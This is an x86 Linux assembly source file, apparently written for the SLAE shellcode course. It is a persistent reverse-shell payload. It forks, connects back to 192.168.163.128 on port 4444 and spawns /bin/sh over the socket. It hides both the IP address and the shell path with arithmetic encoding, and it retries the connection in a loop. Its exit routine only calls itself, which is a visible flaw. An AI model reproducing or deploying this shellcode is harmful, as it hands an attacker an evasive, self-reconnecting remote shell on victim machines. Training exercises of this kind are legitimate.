;SLAE - 1057
section .text
global _start
_start:
; fork(void);
    xor ebx,ebx ; cleanup the rest
    push 0x02
    pop eax	;setting eax to 0x2 and saving one byte
    cdq	   	;setting edx to zero and saving one byte
    xor ecx,ecx 
    int 0x80
    cmp eax,1   ; if this is a child, or we have failed to clone
    jl fork     ; jump to the main code
    jmp exit
fork:
; socket(AF_INET, SOCK_STREAM, 0);
    push eax
    push byte 0x1 ; SOCK_STREAM
    push byte 0x2 ; AF_INET
    mov al, 0x66 ; sys_socketcall
    mov bl,0x1    ; sys_socket
    mov ecx,esp
    int 0x80
 
; dup2(s,i);
    mov ebx,eax ; s
    push 0x3
    pop ecx; moving 3 into ecx
l0:
    mov al,0x3f    ; sys_dup2
    int 0x80
    loop l0	   ;saving around 9 bytes here by just changing the loop-
		   ;methodology 
; connect(s, (sockaddr *) &addr,0x10);
    push 0x7f5c573f        ; IP = not (192.168.163.128)
    not dword [esp]		
    push word 0x5c11    
    push word 0x2        ; AF_INET
    mov ecx,esp
 
    push byte 0x10
    push ecx        ;pointer to arguments
    push ebx        ; s -> standard out/in
    mov ecx,esp
    mov al,0x66
    int 0x80
    xor ecx,ecx
    sub eax,ecx
    jnz cleanup ; cleanup and start over
 
; fork(void);
    mov al,0x02
    int 0x80
    cmp eax,1    ; if this is a child, or we have failed to clone
    jl client    ; jump to the shell
    xor eax,eax
    push eax
    jmp cleanup ; cleanup and start over
 
client:
	; int execve(const char *filename, char *const argv[], char *const envp[])
    mov al,0x0b
    push edx ; null
    push 0x46510d4c
    add dword [esp],0x22222222
    push 0x47400d0d
    add dword [esp],0x22222222
    mov ebx,esp
    push edx ;null
    push ebx ;push ptr addr
    mov ecx,esp
    int 0x80
 
cleanup:
; close(%ebx)
    push 0x06
    pop eax ;reduce size by one more byte 
    int 0x80
    pause
    rdtsc
    pause
    jmp _start
 
exit:
; exit(0);
    xor eax,eax
    call exit 
